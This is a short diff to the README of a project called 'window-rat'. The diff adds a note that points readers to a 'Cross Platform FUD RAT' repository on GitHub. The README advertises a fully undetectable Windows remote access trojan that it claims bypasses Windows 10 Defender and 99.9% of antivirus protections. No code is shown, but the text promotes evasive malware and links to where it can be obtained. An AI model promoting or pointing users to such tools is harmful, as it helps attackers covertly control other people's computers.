@@ -1,5 +1,7 @@
 # window-rat:
 
+# NOTE:
+    Use new Cross Plaftorm FUD RAT https://github.com/machine1337/pyFUD
 # Introduction:
     A Fully Undectable Window RAT that bypass window 10 Defender protection and also bypass 99.9% of other antivirus protections.
     
